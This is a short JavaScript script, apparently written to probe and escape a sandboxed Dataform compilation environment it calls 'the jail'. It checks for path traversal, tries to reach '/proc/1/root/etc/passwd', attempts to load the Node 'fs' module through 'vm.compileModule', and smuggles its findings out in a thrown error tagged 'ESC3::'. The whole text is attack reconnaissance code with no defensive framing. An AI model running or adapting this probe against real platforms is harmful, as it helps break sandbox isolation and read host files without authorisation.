var out = {};
function S(x,n){ try { return String(x).slice(0,n||300); } catch(e){ return "?"; } }
// A. what paths exist in the jail?
var cands = ["/","/definitions","definitions","/definitions/exec.js","exec.js","package.json","/package.json",
  "./package.json","../package.json","../../package.json","/../package.json","/definitions/../package.json",
  "/definitions/../../package.json","dataform.json","/node_modules","node_modules","/node_modules/@dataform/core/package.json",
  "node_modules/@dataform/core/package.json","/tmp","/root","/home","/proc/1/root/etc/passwd"];
out.probe = {};
cands.forEach(function(p){ try { out.probe[p] = "E:"+String(restricted_fs.exists(p)); } catch(e){ out.probe[p]="X:"+S(e,60); } });
// B. read package.json (we know it exists in the repo)
try { out.pkg = S(restricted_fs.readFile("package.json"), 200); } catch(e){ out.pkg="ERR:"+S(e,120); }
try { out.pkg_slash = S(restricted_fs.readFile("/package.json"), 200); } catch(e){ out.pkg_slash="ERR:"+S(e,120); }
// C. can compileModule load a builtin?
try { out.cm_fs = S(vm.compileModule,80); var m = vm.compileModule("fs"); out.cm_fs_ret = S(m,150); } catch(e){ out.cm_fs_err = S(e,200); }
throw new Error("ESC3::" + JSON.stringify(out));
